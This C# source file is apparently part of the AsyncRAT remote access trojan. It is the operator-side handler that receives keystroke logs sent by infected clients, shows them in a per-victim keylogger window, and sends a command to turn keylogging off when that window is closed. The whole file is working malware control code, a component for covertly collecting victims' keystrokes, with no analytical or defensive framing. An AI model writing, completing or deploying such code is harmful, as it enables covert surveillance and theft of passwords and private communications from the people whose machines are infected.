using AsyncRAT_Sharp.Forms;
using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace AsyncRAT_Sharp.Handle_Packet
{
    class HandleKeylogger
    {
        public HandleKeylogger(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                if (Program.form1.InvokeRequired)
                {
                    Program.form1.BeginInvoke((MethodInvoker)(() =>
                    {
                        FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
                        if (KL != null)
                        {
                            KL.SB.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
                            KL.richTextBox1.Text = KL.SB.ToString();
                            KL.richTextBox1.SelectionStart = KL.richTextBox1.TextLength;
                            KL.richTextBox1.ScrollToCaret();
                        }
                        else
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                            msgpack.ForcePathObject("isON").AsString = "false";
                            client.Send(msgpack.Encode2Bytes());
                        }
                    }));
                }

            }
            catch { }
        }
    }
}
